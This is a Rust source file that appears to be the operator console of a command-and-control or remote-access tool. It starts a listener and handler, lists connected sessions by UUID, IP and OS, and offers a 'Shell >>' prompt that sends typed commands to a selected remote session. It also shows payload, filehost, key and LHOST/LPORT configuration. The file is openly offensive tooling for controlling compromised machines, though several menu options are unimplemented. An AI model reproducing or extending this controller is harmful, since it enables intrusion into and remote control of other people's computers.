mod server;
mod protocols;
mod configuration;
mod encryption;
mod updater;

use std::borrow::Borrow;
use crate::configuration::*;
use crate::server::HASHMAP;

use std::io::{Read, Write};
use std::{io, thread};
use std::time::Duration;
use crate::protocols::tcp::send_command;

fn main() -> io::Result<()> {
    let mut interrupted = false;
    menu();
    while !interrupted {
        use std::io::{stdin,stdout,Write};

        let mut decision = String::new();
        print!("Decision >> ");
        let _ = stdout().flush();
        stdin().read_line(&mut decision).expect("You did not enter a correct string!");

        if let Some('\n')= decision.chars().next_back() {
            decision.pop();
        }
        if let Some('\r')= decision.chars().next_back() {
            decision.pop();
        }
        match decision.as_str() {
            "1" => { print_configuration(); },
            "2" => {
                let mut listener_interrupt = false;
                let server_thread = thread::spawn(|| {
                    setup()
                });
                while !listener_interrupt {
                    let mut interaction_decision = String::new();
                    print!("Decision >> ");
                    let _ = stdout().flush();

                    stdin().read_line(&mut interaction_decision).expect("You did not enter a correct string!");

                    if let Some('\n')= interaction_decision.chars().next_back() {
                        interaction_decision.pop();
                    }
                    if let Some('\r')= interaction_decision.chars().next_back() {
                        interaction_decision.pop();
                    }
                    match interaction_decision.as_str() {
                        "help" => { print_help(); },
                        "sessions" => {
                            print_sessions();
                            let mut interaction_id = String::new();
                            print!("With which session you want to interact? >> ");
                            let _ = stdout().flush();
                            stdin()
                                .read_line(&mut interaction_id)
                                .expect("Failed to read id..");
                            if let Some('\n')= interaction_id.chars().next_back() {
                                interaction_id.pop();
                            }
                            if let Some('\r')= interaction_id.chars().next_back() {
                                interaction_id.pop();
                            }
                            let id: u16 = interaction_id.trim().parse().expect("Input is not a valid ID!");
                            let mut interaction_interrupt = false;
                            while !interaction_interrupt {
                                let mut interaction_command = String::new();
                                print!("Shell >> ");
                                let _ = stdout().flush();
                                stdin()
                                    .read_line(&mut interaction_command)
                                    .expect("Failed to read line..");
                                if let Some('\n')= interaction_command.chars().next_back() {
                                    interaction_command.pop();
                                }
                                if let Some('\r')= interaction_command.chars().next_back() {
                                    interaction_command.pop();
                                }
                                match interaction_command.as_str() {
                                    "exit" => { interaction_interrupt = true; },
                                    _ => {
                                        use crate::protocols::tcp;
                                        send_command(&id, String::from(&interaction_command));
                                    },
                                }
                            }
                        },
                        "exit" => {
                            listener_interrupt = true;
                        }
                        _ => { println!("Please enter a valid command!")},
                    }
                }
            },
            "exit" => { interrupted = true; },
            _ => { println!("Please enter a valid choice!")}
        }
    }
    println!("Program exits, have a good day.");
    return Ok(());
}

fn print_help() {

}

fn print_sessions() {
    let mut map = HASHMAP.lock().unwrap();
    println!("ID | UUID | IP | OS | Alive");

    for (key, value) in map.iter() {
        println!("{} | {} | {} | {} | {}", &key, &value.get_uuid(), &value.get_ip(), &value.get_os(), &value.get_alive());

    }
}

fn setup() {
    server::init_server();
}

fn print_configuration() {
    let mode = ServerMode {
        protocol: PROTOCOL,
        encryption: ENCRYPTION,
        lhost: String::from(LHOST),
        lport: LPORT,
        srvhost: String::from(SRVHOST),
        srvport: SRVPORT
    };
    println!("LHOST: {}", mode.lhost);
    println!("LPORT: {}", mode.lport);
    println!("SRVHOST: {}", mode.srvhost);
    println!("SRVPORT: {}", mode.srvport);

    match &mode.protocol {
        CommunicationMode::Tcp => {
            println!("Protocol: TCP");
        },
        CommunicationMode::Udp => {
            println!("Protocol: UDP");
        },
    }

    match &mode.encryption {
        EncryptionMode::None => {
            println!("Encryption: None")
        },
        EncryptionMode::Aes(_) => {
            println!("Encryption: AES.")
        },
        EncryptionMode::Rsa(_) => {
            println!("Encryption: RSA.")
        },
    }
}

fn menu() {
    println!("
______________________
~~~ Welcome ~~~\n
Choose an option:
1. Edit Host and Payload Configuration
2. Start a Listener and Handler / Foreground if already active
3. Clear Filehost Folder
4. Clear Keys Folder
0. Usage
\n
Type 'exit' to leave
______________________
\n");
}
